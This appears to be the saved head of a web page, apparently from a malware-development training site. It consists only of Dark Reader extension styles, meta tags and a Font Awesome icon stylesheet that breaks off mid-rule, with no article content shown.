<!DOCTYPE html>
<html class="dark" data-darkreader-mode="dynamic" data-darkreader-scheme="dark"><script type="text/javascript" src="69_files/inject.js"></script><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8"><style class="darkreader darkreader--fallback" media="screen"></style><style class="darkreader darkreader--user-agent" media="screen">@layer {
html {
    background-color: var(--darkreader-background-ffffff, #181a1b) !important;
}
html {
    color-scheme: dark !important;
}
iframe {
    color-scheme: dark !important;
}
html, body {
    background-color: var(--darkreader-background-ffffff, #181a1b);
}
html, body {
    border-color: var(--darkreader-border-4c4c4c, #736b5e);
    color: var(--darkreader-text-000000, #e8e6e3);
}
a {
    color: var(--darkreader-text-0040ff, #3391ff);
}
table {
    border-color: var(--darkreader-border-808080, #545b5e);
}
mark {
    color: var(--darkreader-text-000000, #e8e6e3);
}
::placeholder {
    color: var(--darkreader-text-a9a9a9, #b2aba1);
}
input:-webkit-autofill,
textarea:-webkit-autofill,
select:-webkit-autofill {
    background-color: var(--darkreader-background-faffbd, #404400) !important;
    color: var(--darkreader-text-000000, #e8e6e3) !important;
}
* {
    scrollbar-color: var(--darkreader-background-b0b0b0, #454a4d) var(--darkreader-background-f1f1f1, #202324);
}
::selection {
    background-color: var(--darkreader-background-0060d4, #004daa) !important;
    color: var(--darkreader-text-ffffff, #e8e6e3) !important;
}
::-moz-selection {
    background-color: var(--darkreader-background-0060d4, #004daa) !important;
    color: var(--darkreader-text-ffffff, #e8e6e3) !important;
}
}</style><style class="darkreader darkreader--text" media="screen"></style><style class="darkreader darkreader--invert" media="screen">.jfk-bubble.gtx-bubble, .captcheck_answer_label > input + img, span#closed_text > img[src^="https://www.gstatic.com/images/branding/googlelogo"], span[data-href^="https://www.hcaptcha.com/"] > #icon, img.Wirisformula, a[data-testid="headerMediumLogo"]>svg, .d2l-navigation-link-image-container, .d2l-iframe-loading-container {
    filter: invert(100%) hue-rotate(180deg) contrast(90%) !important;
}</style><style class="darkreader darkreader--inline" media="screen">[data-darkreader-inline-bgcolor] {
  background-color: var(--darkreader-inline-bgcolor) !important;
}
[data-darkreader-inline-bgimage] {
  background-image: var(--darkreader-inline-bgimage) !important;
}
[data-darkreader-inline-border] {
  border-color: var(--darkreader-inline-border) !important;
}
[data-darkreader-inline-border-bottom] {
  border-bottom-color: var(--darkreader-inline-border-bottom) !important;
}
[data-darkreader-inline-border-left] {
  border-left-color: var(--darkreader-inline-border-left) !important;
}
[data-darkreader-inline-border-right] {
  border-right-color: var(--darkreader-inline-border-right) !important;
}
[data-darkreader-inline-border-top] {
  border-top-color: var(--darkreader-inline-border-top) !important;
}
[data-darkreader-inline-boxshadow] {
  box-shadow: var(--darkreader-inline-boxshadow) !important;
}
[data-darkreader-inline-color] {
  color: var(--darkreader-inline-color) !important;
}
[data-darkreader-inline-fill] {
  fill: var(--darkreader-inline-fill) !important;
}
[data-darkreader-inline-stroke] {
  stroke: var(--darkreader-inline-stroke) !important;
}
[data-darkreader-inline-outline] {
  outline-color: var(--darkreader-inline-outline) !important;
}
[data-darkreader-inline-stopcolor] {
  stop-color: var(--darkreader-inline-stopcolor) !important;
}
[data-darkreader-inline-bg] {
  background: var(--darkreader-inline-bg) !important;
}
[data-darkreader-inline-border-short] {
  border: var(--darkreader-inline-border-short) !important;
}
[data-darkreader-inline-border-bottom-short] {
  border-bottom: var(--darkreader-inline-border-bottom-short) !important;
}
[data-darkreader-inline-border-left-short] {
  border-left: var(--darkreader-inline-border-left-short) !important;
}
[data-darkreader-inline-border-right-short] {
  border-right: var(--darkreader-inline-border-right-short) !important;
}
[data-darkreader-inline-border-top-short] {
  border-top: var(--darkreader-inline-border-top-short) !important;
}
[data-darkreader-inline-invert] {
    filter: invert(100%) hue-rotate(180deg);
}</style><style class="darkreader darkreader--variables" media="screen">:root {
   --darkreader-neutral-background: var(--darkreader-background-ffffff, #181a1b);
   --darkreader-neutral-text: var(--darkreader-text-000000, #e8e6e3);
   --darkreader-selection-background: var(--darkreader-background-0060d4, #004daa);
   --darkreader-selection-text: var(--darkreader-text-ffffff, #e8e6e3);
}</style><style class="darkreader darkreader--root-vars" media="screen"></style>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="ie-edge">
        <link rel="stylesheet" href="69_files/template.css"><style class="darkreader darkreader--sync" media="screen"></style>
        <link rel="shortcut icon" href="https://maldevacademy.com/maldev-icon.png">
        <!-- fontawesome for icons -->
        <link rel="stylesheet" href="69_files/font-awesome.min.css"><style class="darkreader darkreader--cors" media="screen">.fa{display:inline-block;font:normal normal normal 14px/1 FontAwesome;font-size:inherit;text-rendering:auto;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.fa-lg{font-size:1.33333333em;line-height:.75em;vertical-align:-15%}.fa-2x{font-size:2em}.fa-3x{font-size:3em}.fa-4x{font-size:4em}.fa-5x{font-size:5em}.fa-fw{width:1.28571429em;text-align:center}.fa-ul{padding-left:0;margin-left:2.14285714em;list-style-type:none}.fa-ul>li{position:relative}.fa-li{position:absolute;left:-2.14285714em;width:2.14285714em;top:.14285714em;text-align:center}.fa-li.fa-lg{left:-1.85714286em}.fa-border{padding:.2em .25em .15em;border:solid .08em #eee;border-radius:.1em}.fa-pull-left{float:left}.fa-pull-right{float:right}.fa.fa-pull-left{margin-right:.3em}.fa.fa-pull-right{margin-left:.3em}.pull-right{float:right}.pull-left{float:left}.fa.pull-left{margin-right:.3em}.fa.pull-right{margin-left:.3em}.fa-spin{-webkit-animation:fa-spin 2s infinite linear;animation:fa-spin 2s infinite linear}.fa-pulse{-webkit-animation:fa-spin 1s infinite steps(8);animation:fa-spin 1s infinite steps(8)}@-webkit-keyframes fa-spin{0%{-webkit-transform:rotate(0deg);transform:rotate(0deg)}100%{-webkit-transform:rotate(359deg);transform:rotate(359deg)}}@keyframes fa-spin{0%{-webkit-transform:rotate(0deg);transform:rotate(0deg)}100%{-webkit-transform:rotate(359deg);transform:rotate(359deg)}}.fa-rotate-90{-ms-filter:"progid:DXImageTransform.Microsoft.BasicImage(rotation=1)";-webkit-transform:rotate(90deg);-ms-transform:rotate(90deg);transform:rotate(90deg)}.fa-rotate-180{-ms-filter:"progid:DXImageTransform.Microsoft.BasicImage(rotation=2)";-webkit-transform:rotate(180deg);-ms-transform:rotate(180deg);transform:rotate(180deg)}.fa-rotate-270{-ms-filter:"progid:DXImageTransform.Microsoft.BasicImage(rotation=3)";-webkit-transform:rotate(270deg);-ms-transform:rotate(270deg);transform:rotate(270deg)}.fa-flip-horizontal{-ms-filter:"progid:DXImageTransform.Microsoft.BasicImage(rotation=0, mirror=1)";-webkit-transform:scale(-1, 1);-ms-transform:scale(-1, 1);transform:scale(-1, 1)}.fa-flip-vertical{-ms-filter:"progid:DXImageTransform.Microsoft.BasicImage(rotation=2, mirror=1)";-webkit-transform:scale(1, -1);-ms-transform:scale(1, -1);transform:scale(1, -1)}:root .fa-rotate-90,:root .fa-rotate-180,:root .fa-rotate-270,:root .fa-flip-horizontal,:root .fa-flip-vertical{filter:none}.fa-stack{position:relative;display:inline-block;width:2em;height:2em;line-height:2em;vertical-align:middle}.fa-stack-1x,.fa-stack-2x{position:absolute;left:0;width:100%;text-align:center}.fa-stack-1x{line-height:inherit}.fa-stack-2x{font-size:2em}.fa-inverse{color:#fff}.fa-glass:before{content:"\f000"}.fa-music:before{content:"\f001"}.fa-search:before{content:"\f002"}.fa-envelope-o:before{content:"\f003"}.fa-heart:before{content:"\f004"}.fa-star:before{content:"\f005"}.fa-star-o:before{content:"\f006"}.fa-user:before{content:"\f007"}.fa-film:before{content:"\f008"}.fa-th-large:before{content:"\f009"}.fa-th:before{content:"\f00a"}.fa-th-list:before{content:"\f00b"}.fa-check:before{content:"\f00c"}.fa-remove:before,.fa-close:before,.fa-times:before{content:"\f00d"}.fa-search-plus:before{content:"\f00e"}.fa-search-minus:before{content:"\f010"}.fa-power-off:before{content:"\f011"}.fa-signal:before{content:"\f012"}.fa-gear:before,.fa-cog:before{content:"\f013"}.fa-trash-o:before{content:"\f014"}.fa-home:before{content:"\f015"}.fa-file-o:before{content:"\f016"}.fa-clock-o:before{content:"\f017"}.fa-road:before{content:"\f018"}.fa-download:before{content:"\f019"}.fa-arrow-circle-o-down:before{content:"\f01a"}.fa-arrow-circle-o-up:before{content:"\f01b"}.fa-inbox:before{content:"\f01c"}.fa-play-circle-o:before{content:"\f01d"}.fa-rotate-right:before,.fa-repeat:before{content:"\f01e"}.fa-refresh:before{content:"\f021"}.fa-list-alt:before{content:"\f022"}.fa-lock:before{content:"\f023"}.fa-flag:before{content:"\f024"}.fa-headphones:before{content:"\f025"}.fa-volume-off:before{content:"\f026"}.fa-volume-down:before{content:"\f027"}.fa-volume-up:before{content:"\f028"}.fa-qrcode:before{content:"\f029"}.fa-barcode:before{content:"\f02a"}.fa-tag:before{content:"\f02b"}.fa-tags:before{content:"\f02c"}.fa-book:before{content:"\f02d"}.fa-bookmark:before{content:"\f02e"}.fa-print:before{content:"\f02f"}.fa-camera:before{content:"\f030"}.fa-font:before{content:"\f031"}.fa-bold:before{content:"\f032"}.fa-italic:before{content:"\f033"}.fa-text-height:before{content:"\f034"}.fa-text-width:before{content:"\f035"}.fa-align-left:before{content:"\f036"}.fa-align-center:before{content:"\f037"}.fa-align-right:before{content:"\f038"}.fa-align-justify:before{content:"\f039"}.fa-list:before{content:"\f03a"}.fa-dedent:before,.fa-outdent:before{content:"\f03b"}.fa-indent:before{content:"\f03c"}.fa-video-camera:before{content:"\f03d"}.fa-photo:before,.fa-image:before,.fa-picture-o:before{content:"\f03e"}.fa-pencil:before{content:"\f040"}.fa-map-marker:before{content:"\f041"}.fa-adjust:before{content:"\f042"}.fa-tint:before{content:"\f043"}.fa-edit:before,.fa-pencil-square-o:before{content:"\f044"}.fa-share-square-o:before{content:"\f045"}.fa-check-square-o:before{content:"\f046"}.fa-arrows:before{content:"\f047"}.fa-step-backward:before{content:"\f048"}.fa-fast-backward:before{content:"\f049"}.fa-backward:before{content:"\f04a"}.fa-play:before{content:"\f04b"}.fa-pause:before{content:"\f04c"}.fa-stop:before{content:"\f04d"}.fa-forward:before{content:"\f04e"}.fa-fast-forward:before{content:"\f050"}.fa-step-forward:before{content:"\f051"}.fa-eject:before{content:"\f052"}.fa-chevron-left:before{content:"\f053"}.fa-chevron-right:before{content:"\f054"}.fa-plus-circle:before{content:"\f055"}.fa-minus-circle:before{content:"\f056"}.fa-times-circle:before{content:"\f057"}.fa-check-circle:before{content:"\f058"}.fa-question-circle:before{content:"\f059"}.fa-info-circle:before{content:"\f05a"}.fa-crosshairs:before{content:"\f05b"}.fa-times-circle-o:before{content:"\f05c"}.fa-check-circle-o:before{content:"\f05d"}.fa-ban:before{content:"\f05e"}.fa-arrow-left:before{content:"\f060"}.fa-arrow-right:before{content:"\f061"}.fa-arrow-up:before{content:"\f062"}.fa-arrow-down:before{content:"\f063"}.fa-mail-forward:before,.fa-share:before{content:"\f064"}.fa-expand:before{content:"\f065"}.fa-compress:before{content:"\f066"}.fa-plus:before{content:"\f067"}.fa-minus:before{content:"\f068"}.fa-asterisk:before{content:"\f069"}.fa-exclamation-circle:before{content:"\f06a"}.fa-gift:before{content:"\f06b"}.fa-leaf:before{content:"\f06c"}.fa-fire:before{content:"\f06d"}.fa-eye:before{content:"\f06e"}.fa-eye-slash:before{content:"\f070"}.fa-warning:before,.fa-exclamation-triangle:before{content:"\f071"}.fa-plane:before{content:"\f072"}.fa-calendar:before{content:"\f073"}.fa-random:before{content:"\f074"}.fa-comment:before{content:"\f075"}.fa-magnet:before{content:"\f076"}.fa-chevron-up:before{content:"\f077"}.fa-chevron-down:before{content:"\f078"}.fa-retweet:before{content:"\f079"}.fa-shopping-cart:before{content:"\f07a"}.fa-folder:before{content:"\f07b"}.fa-folder-open:before{content:"\f07c"}.fa-arrows-v:before{content:"\f07d"}.fa-arrows-h:before{content:"\f07e"}.fa-bar-chart-o:before,.fa-bar-chart:before{content:"\f080"}.fa-twitter-square:before{content:"\f081"}.fa-facebook-square:before{content:"\f082"}.fa-camera-retro:before{content:"\f083"}.fa-key:before{content:"\f084"}.fa-gears:before,.fa-cogs:before{content:"\f085"}.fa-comments:before{content:"\f086"}.fa-thumbs-o-up:before{content:"\f087"}.fa-thumbs-o-down:before{content:"\f088"}.fa-star-half:before{content:"\f089"}.fa-heart-o:before{content:"\f08a"}.fa-sign-out:before{content:"\f08b"}.fa-linkedin-square:before{content:"\f08c"}.fa-thumb-tack:before{content:"\f08d"}.fa-external-link:before{content:"\f08e"}.fa-sign-in:before{content:"\f090"}.fa-trophy:before{content:"\f091"}.fa-github-square:before{content:"\f092"}.fa-upload:before{content:"\f093"}.fa-lemon-o:before{content:"\f094"}.fa-phone:before{content:"\f095"}.fa-square-o:before{content:"\f096"}.fa-bookmark-o:before{content:"\f097"}.fa-phone-square:before{content:"\f098"}.fa-twitter:before{content:"\f099"}.fa-facebook-f:before,.fa-facebook:before{content:"\f09a"}.fa-github:before{content:"\f09b"}.fa-unlock:before{content:"\f09c"}.fa-credit-card:before{content:"\f09d"}.fa-feed:before,.fa-rss:before{content:"\f09e"}.fa-hdd-o:before{content:"\f0a0"}.fa-bullhorn:before{content:"\f0a1"}.fa-bell:before{content:"\f0f3"}.fa-certificate:before{content:"\f0a3"}.fa-hand-o-right:before{content:"\f0a4"}.fa-hand-o-left:before{content:"\f0a5"}.fa-hand-o-up:before{content:"\f0a6"}.fa-hand-o-down:before{content:"\f0a7"}.fa-arrow-circle-left:before{content:"\f0a8"}.fa-arrow-circle-right:before{content:"\f0a9"}.fa-arrow-circle-up:before{content:"\f0aa"}.fa-arrow-circle-down:before{content:"\f0ab"}.fa-globe:before{content:"\f0ac"}.fa-wrench:before{content:"\f0ad"}.fa-tasks:before{content:"\f0ae"}.fa-filter:before{content:"\f0b0"}.fa-briefcase:before{content:"\f0b1"}.fa-arrows-alt:before{content:"\f0b2"}.fa-group:before,.fa-users:before{content:"\f0c0"}.fa-chain:before,.fa-link:before{content:"\f0c1"}.fa-cloud:before{content:"\f0c2"}.fa-flask:before{content:"\f0c3"}.fa-cut:before,.fa-scissors:before{content:"\f0c4"}.fa-copy:before,.fa-files-o:before{content:"\f0c5"}.fa-paperclip:before{content:"\f0c6"}.fa-save:before,.fa-floppy-o:before{content:"\f0c7"}.fa-square:before{content:"\f0c8"}.fa-navicon:before,.fa-reorder:before,.fa-bars:before{content:"\f0c9"}.fa-list-ul:before{content:"\f0ca"}.fa-list-ol:before{content:"\f0cb"}.fa-strikethrough:before{content:"\f0cc"}.fa-underline:before{content:"\f0cd"}.fa-table:before{content:"\f0ce"}.fa-magic:before{content:"\f0d0"}.fa-truck:before{content:"\f0d1"}.fa-pinterest:before{content:"\f0d2"}.fa-pinterest-square:before{content:"\f0d3"}.fa-google-plus-square:before{content:"\f0d4"}.fa-google-plus:before{content:"\f0d5"}.fa-money:before{content:"\f0d6"}.fa-caret-down:before{content:"\f0d7"}.fa-caret-up:before{content:"\f0d8"}.fa-caret-left:before{content:"\f0d9"}.fa-caret-right:before{content:"\f0da"}.fa-columns:before{content:"\f0db"}.fa-unsorted:before,.fa-sort:before{content:"\f0dc"}.fa-sort-down:before,.fa-sort-desc:before{content:"\f0dd"}.fa-sort-up:before,.fa-sort-asc:before{content:"\f0de"}.fa-envelope:before{content:"\f0e0"}.fa-linkedin:before{content:"\f0e1"}.fa-rotate-left:before,.fa-undo:before{content:"\f0e2"}.fa-legal:before,.fa-gavel:before{content:"\f0e3"}.fa-dashboard:before,.fa-tachometer:before{content:"\f0e4"}.fa-comment-o:before{content:"\f0e5"}.fa-comments-o:before{content:"\f0e6"}.fa-flash:before,.fa-bolt:before{content:"\f0e7"}.fa-sitemap:before{content:"\f0e8"}.fa-umbrella:before{content:"\f0e9"}.fa-paste:before,.fa-clipboard:before{content:"\f0ea"}.fa-lightbulb-o:before{content:"\f0eb"}.fa-exchange:before{content:"\f0ec"}.fa-cloud-download:before{content:"\f0ed"}.fa-cloud-upload:before{content:"\f0ee"}.fa-user-md:before{content:"\f0f0"}.fa-stethoscope:before{content:"\f0f1"}.fa-suitcase:before{content:"\f0f2"}.fa-bell-o:before{content:"\f0a2"}.fa-coffee:before{content:"\f0f4"}.fa-cutlery:before{content:"\f0f5"}.fa-file-text-o:before{content:"\f0f6"}.fa-building-o:before{content:"\f0f7"}.fa-hospital-o:before{content:"\f0f8"}.fa-ambulance:before{content:"\f0f9"}.fa-medkit:before{content:"\f0fa"}.fa-fighter-jet:before{content:"\f0fb"}.fa-beer:before{content:"\f0fc"}.fa-h-square:before{content:"\f0fd"}.fa-plus-square:before{content:"\f0fe"}.fa-angle-double-left:before{content:"\f100"}.fa-angle-double-right:before{content:"\f101"}.fa-angle-double-up:before{content:"\f102"}.fa-angle-double-down:before{content:"\f103"}.fa-angle-left:before{content:"\f104"}.fa-angle-right:before{content:"\f105"}.fa-angle-up:before{content:"\f106"}.fa-angle-down:before{content:"\f107"}.fa-desktop:before{content:"\f108"}.fa-laptop:before{content:"\f109"}.fa-tablet:before{content:"\f10a"}.fa-mobile-phone:before,.fa-mobile:before{content:"\f10b"}.fa-circle-o:before{content:"\f10c"}.fa-quote-left:before{content:"\f10d"}.fa-quote-right:before{content:"\f10e"}.fa-spinner:before{content:"\f110"}.fa-circle:before{content:"\f111"}.fa-mail-reply:before,.fa-reply:before{content:"\f112"}.fa-github-alt:before{content:"\f113"}.fa-folder-o:before{content:"\f114"}.fa-folder-open-o:before{content:"\f115"}.fa-smile-o:before{content:"\f118"}.fa-frown-o:before{content:"\f119"}.fa-meh-o:before{content:"\f11a"}.fa-gamepad:before{content:"\f11b"}.fa-keyboard-o:before{content:"\f11c"}.fa-flag-o:before{content:"\f11d"}.fa-flag-checkered:before{content:"\f11e"}.fa-terminal:before{content:"\f120"}.fa-code:before{content:"\f121"}.fa-mail-reply-all:before,.fa-reply-all:before{content:"\f122"}.fa-star-half-empty:before,.fa-star-half-full:before,.fa-star-half-o:before{content:"\f123"}.fa-location-arrow:before{content:"\f124"}.fa-crop:before{content:"\f125"}.fa-code-fork:before{content:"\f126"}.fa-unlink:before,.fa-chain-broken:before{content:"\f127"}.fa-question:before{content:"\f128"}.fa-info:before{content:"\f129"}.fa-exclamation:before{content:"\f12a"}.fa-superscript:before{content:"\f12b"}.fa-subscript:before{content:"\f12c"}.fa-eraser:before{content:"\f12d"}.fa-puzzle-piece:before{content:"\f12e"}.fa-microphone:before{content:"\f130"}.fa-microphone-slash:before{content:"\f131"}.fa-shield:before{content:"\f132"}.fa-calendar-o:before{content:"\f133"}.fa-fire-extinguisher:before{content:"\f134"}.fa-rocket:before{content:"\f135"}.fa-maxcdn:before{content:"\f136"}.fa-chevron-circle-left:before{content:"\f137"}.fa-chevron-circle-right:before{content:"\f138"}.fa-chevron-circle-up:before{content:"\f139"}.fa-chevron-circle-down:before{content:"\f13a"}.fa-html5:before{content:"\f13b"}.fa-css3:before{content:"\f13c"}.fa-anchor:before{content:"\f13d"}.fa-unlock-alt:before{content:"\f13e"}.fa-bullseye:before{content:"\f140"}.fa-ellipsis-h:before{content:"\f141"}.fa-ellipsis-v:before{content:"\f142"}.fa-rss-square:before{content:"\f143"}.fa-play-circle:before{content:"\f144"}.fa-ticket:before{content:"\f145"}.fa-minus-square:before{content:"\f146"}.fa-minus-square-o:before{content:"\f147"}.fa-level-up:before{content:"\f148"}.fa-level-down:before{content:"\f149"}.fa-check-square:before{content:"\f14a"}.fa-pencil-square:before{content:"\f14b"}.fa-external-link-square:before{content:"\f14c"}.fa-share-square:before{content:"\f14d"}.fa-compass:before{content:"\f14e"}.fa-toggle-down:before,.fa-caret-square-o-down:before{content:"\f150"}.fa-toggle-up:before,.fa-caret-square-o-up:before{content:"\f151"}.fa-toggle-right:before,.fa-caret-square-o-right:before{content:"\f152"}.fa-euro:before,.fa-eur:before{content:"\f153"}.fa-gbp:before{content:"\f154"}.fa-dollar:before,.fa-usd:before{content:"\f155"}.fa-rupee:before,.fa-inr:before{content:"\f156"}.fa-cny:before,.fa-rmb:before,.fa-yen:before,.fa-jpy:before{content:"\f157"}.fa-ruble:before,.fa-rouble:before,.fa-rub:before{content:"\f158"}.fa-won:before,.fa-krw:before{content:"\f159"}.fa-bitcoin:before,.fa-btc:before{content:"\f15a"}.fa-file:before{content:"\f15b"}.fa-file-text:before{content:"\f15c"}.fa-sort-alpha-asc:before{content:"\f15d"}.fa-sort-alpha-desc:before{content:"\f15e"}.fa-sort-amount-asc:before{content:"\f160"}.fa-sort-amount-desc:before{content:"\f161"}.fa-sort-numeric-asc:before{content:"\f162"}.fa-sort-numeric-desc:before{content:"\f163"}.fa-thumbs-up:before{content:"\f164"}.fa-thumbs-down:before{content:"\f165"}.fa-youtube-square:before{content:"\f166"}.fa-youtube:before{content:"\f167"}.fa-xing:before{content:"\f168"}.fa-xing-square:before{content:"\f169"}.fa-youtube-play:before{content:"\f16a"}.fa-dropbox:before{content:"\f16b"}.fa-stack-overflow:before{content:"\f16c"}.fa-instagram:before{content:"\f16d"}.fa-flickr:before{content:"\f16e"}.fa-adn:before{content:"\f170"}.fa-bitbucket:before{content:"\f171"}.fa-bitbucket-square:before{content:"\f172"}.fa-tumblr:before{content:"\f173"}.fa-tumblr-square:before{content:"\f174"}.fa-long-arrow-down:before{content:"\f175"}.fa-long-arrow-up:before{content:"\f176"}.fa-long-arrow-left:before{content:"\f177"}.fa-long-arrow-right:before{content:"\f178"}.fa-apple:before{content:"\f179"}.fa-windows:before{content:"\f17a"}.fa-android:before{content:"\f17b"}.fa-linux:before{content:"\f17c"}.fa-dribbble:before{content:"\f17d"}.fa-skype:before{content:"\f17e"}.fa-foursquare:before{content:"\f180"}.fa-trello:before{content:"\f181"}.fa-female:before{content:"\f182"}.fa-male:before{content:"\f183"}.fa-gittip:before,.fa-gratipay:before{content:"\f184"}.fa-sun-o:before{content:"\f185"}.fa-moon-o:before{content:"\f186"}.fa-archive:before{content:"\f187"}.fa-bug:before{content:"\f188"}.fa-vk:before{content:"\f189"}.fa-weibo:before{content:"\f18a"}.fa-renren:before{content:"\f18b"}.fa-pagelines:before{content:"\f18c"}.fa-stack-exchange:before{content:"\f18d"}.fa-arrow-circle-o-right:before{content:"\f18e"}.fa-arrow-circle-o-left:before{content:"\f190"}.fa-toggle-left:before,.fa-caret-square-o-left:before{content:"\f191"}.fa-dot-circle-o:before{content:"\f192"}.fa-wheelchair:before{content:"\f193"}.fa-vimeo-square:before{content:"\f194"}.fa-turkish-lira:before,.fa-try:before{content:"\f195"}.fa-plus-square-o:before{content:"\f196"}.fa-space-shuttle:before{content:"\f197"}.fa-slack:before{content:"\f198"}.fa-envelope-square:before{content:"\f199"}.fa-wordpress:before{content:"\f19a"}.fa-openid:before{content:"\f19b"}.fa-institution:before,.fa-bank:before,.fa-university:before{content:"\f19c"}.fa-mortar-board:before,.fa-graduation-cap:before{content:"\f19d"}.fa-yahoo:before{content:"\f19e"}.fa-google:before{content:"\f1a0"}.fa-reddit:before{content:"\f1a1"}.fa-reddit-square:before{content:"\f1a2"}.fa-stumbleupon-circle:before{content:"\f1a3"}.fa-stumbleupon:before{content:"\f1a4"}.fa-delicious:before{content:"\f1a5"}.fa-digg:before{content:"\f1a6"}.fa-pied-piper-pp:before{content:"\f1a7"}.fa-pied-piper-alt:before{content:"\f1a8"}.fa-drupal:before{content:"\f1a9"}.fa-joomla:before{content:"\f1aa"}.fa-language:before{content:"\f1ab"}.fa-fax:before{content:"\f1ac"}.fa-building:before{content:"\f1ad"}.fa-child:before{content:"\f1ae"}.fa-paw:before{content:"\f1b0"}.fa-spoon:before{content:"\f1b1"}.fa-cube:before{content:"\f1b2"}.fa-cubes:before{content:"\f1b3"}.fa-behance:before{content:"\f1b4"}.fa-behance-square:before{content:"\f1b5"}.fa-steam:before{content:"\f1b6"}.fa-steam-square:before{content:"\f1b7"}.fa-recycle:before{content:"\f1b8"}.fa-automobile:before,.fa-car:before{content:"\f1b9"}.fa-cab:before,.fa-taxi:before{content:"\f1ba"}.fa-tree:before{content:"\f1bb"}.fa-spotify:before{content:"\f1bc"}.fa-deviantart:before{content:"\f1bd"}.fa-soundcloud:before{content:"\f1be"}.fa-database:before{content:"\f1c0"}.fa-file-pdf-o:before{content:"\f1c1"}.fa-file-word-o:before{content:"\f1c2"}.fa-file-excel-o:before{content:"\f1c3"}.fa-file-powerpoint-o:before{content:"\f1c4"}.fa-file-photo-o:before,.fa-file-picture-o:before,.fa-file-image-o:before{content:"\f1c5"}.fa-file-zip-o:before,.fa-file-archive-o:before{content:"\f1c6"}.fa-file-sound-o:before,.fa-file-audio-o:before{content:"\f1c7"}.fa-file-movie-o:before,.fa-file-video-o:before{content:"\f1c8"}.fa-file-code-o:before{content:"\f1c9"}.fa-vine:before{content:"\f1ca"}.fa-codepen:before{content:"\f1cb"}.fa-jsfiddle:before{content:"\f1cc"}.fa-life-bouy:before,.fa-life-buoy:before,.fa-life-saver:before,.fa-support:before,.fa-life-ring:before{content:"\f1cd"}.fa-circle-o-notch:before{content:"\f1ce"}.fa-ra:before,.fa-resistance:before,.fa-rebel:before{content:"\f1d0"}.fa-ge:before,.fa-empire:before{content:"\f1d1"}.fa-git-square:before{content:"\f1d2"}.fa-git:before{content:"\f1d3"}.fa-y-combinator-square:before,.fa-yc-square:before,.fa-hacker-news:before{content:"\f1d4"}.fa-tencent-weibo:before{content:"\f1d5"}.fa-qq:before{content:"\f1d6"}.fa-wechat:before,.fa-weixin:before{content:"\f1d7"}.fa-send:before,.fa-paper-plane:before{content:"\f1d8"}.fa-send-o:before,.fa-paper-plane-o:before{content:"\f1d9"}.fa-history:before{content:"\f1da"}.fa-circle-thin:before{content:"\f1db"}.fa-header:before{content:"\f1dc"}.fa-paragraph:before{content:"\f1dd"}.fa-sliders:before{content:"\f1de"}.fa-share-alt:before{content:"\f1e0"}.fa-share-alt-square:before{content:"\f1e1"}.fa-bomb:before{content:"\f1e2"}.fa-soccer-ball-o:before,.fa-futbol-o:before{content:"\f1e3"}.fa-tty:before{content:"\f1e4"}.fa-binoculars:before{content:"\f1e5"}.fa-plug:before{content:"\f1e6"}.fa-slideshare:before{content:"\f1e7"}.fa-twitch:before{content:"\f1e8"}.fa-yelp:before{content:"\f1e9"}.fa-newspaper-o:before{content:"\f1ea"}.fa-wifi:before{content:"\f1eb"}.fa-calculator:before{content:"\f1ec"}.fa-paypal:before{content:"\f1ed"}.fa-google-wallet:before{content:"\f1ee"}.fa-cc-visa:before{content:"\f1f0"}.fa-cc-mastercard:before{content:"\f1f1"}.fa-cc-discover:before{content:"\f1f2"}.fa-cc-amex:before{content:"\f1f3"}.fa-cc-paypal:before{content:"\f1f4"}.fa-cc-stripe:before{content:"\f1f5"}.fa-bell-slash:before{content:"\f1f6"}.fa-bell-slash-o:before{content:"\f1f7"}.fa-trash:before{content:"\f1f8"}.fa-copyright:before{content:"\f1f9"}.fa-at:before{content:"\f1fa"}.fa-eyedropper:before{content:"\f1fb"}.fa-paint-brush:before{content:"\f1fc"}.fa-birthday-cake:before{content:"\f1fd"}.fa-area-chart:before{content:"\f1fe"}.fa-pie-chart:before{content:"\f200"}.fa-line-chart:before{content:"\f201"}.fa-lastfm:before{content:"\f202"}.fa-lastfm-square:before{content:"\f203"}.fa-toggle-off:before{content:"\f204"}.fa-toggle-on:before{content:"\f205"}.fa-bicycle:before{content:"\f206"}.fa-bus:before{content:"\f207"}.fa-ioxhost:before{content:"\f208"}.fa-angellist:before{content:"\f209"}.fa-cc:before{content:"\f20a"}.fa-shekel:before,.fa-sheqel:before,.fa-ils:before{content:"\f20b"}.fa-meanpath:before{content:"\f20c"}.fa-buysellads:before{content:"\f20d"}.fa-connectdevelop:before{content:"\f20e"}.fa-dashcube:before{content:"\f210"}.fa-forumbee:before{content:"\f211"}.fa-leanpub:before{content:"\f212"}.fa-sellsy:before{content:"\f213"}.fa-shirtsinbulk:before{content:"\f214"}.fa-simplybuilt:before{content:"\f215"}.fa-skyatlas:before{content:"\f216"}.fa-cart-plus:before{content:"\f217"}.fa-cart-arrow-down:before{content:"\f218"}.fa-diamond:before{content:"\f219"}.fa-ship:before{content:"\f21a"}.fa-user-secret:before{content:"\f21b"}.fa-motorcycle:before{content:"\f21c"}.fa-street-view:before{content:"\f21d"}.fa-heartbeat:before{content:"\f21e"}.fa-venus:before{content:"\f221"}.fa-mars:before{content:"\f222"}.fa-mercury:before{content:"\f223"}.fa-intersex:before,.fa-transgender:before{content:"\f224"}.fa-transgender-alt:before{content:"\f225"}.fa-venus-double:before{content:"\f226"}.fa-mars-double:before{content:"\f227"}.fa-venus-mars:before{content:"\f228"}.fa-mars-stroke:before{content:"\f229"}.fa-mars-stroke-v:before{content:"\f22a"}.fa-mars-stroke-h:before{content:"\f22b"}.fa-neuter:before{content:"\f22c"}.fa-genderless:before{content:"\f22d"}.fa-facebook-official:before{content:"\f230"}.fa-pinterest-p:before{content:"\f231"}.fa-whatsapp:before{content:"\f232"}.fa-server:before{content:"\f233"}.fa-user-plus:before{content:"\f234"}.fa-user-times:before{content:"\f235"}.fa-hotel:before,.fa-bed:before{content:"\f236"}.fa-viacoin:before{content:"\f237"}.fa-train:before{content:"\f238"}.fa-subway:before{content:"\f239"}.fa-medium:before{content:"\f23a"}.fa-yc:before,.fa-y-combinator:before{content:"\f23b"}.fa-optin-monster:before{content:"\f23c"}.fa-opencart:before{content:"\f23d"}.fa-expeditedssl:before{content:"\f23e"}.fa-battery-4:before,.fa-battery:before,.fa-battery-full:before{content:"\f240"}.fa-battery-3:before,.fa-battery-three-quarters:before{content:"\f241"}.fa-battery-2:before,.fa-battery-half:before{content:"\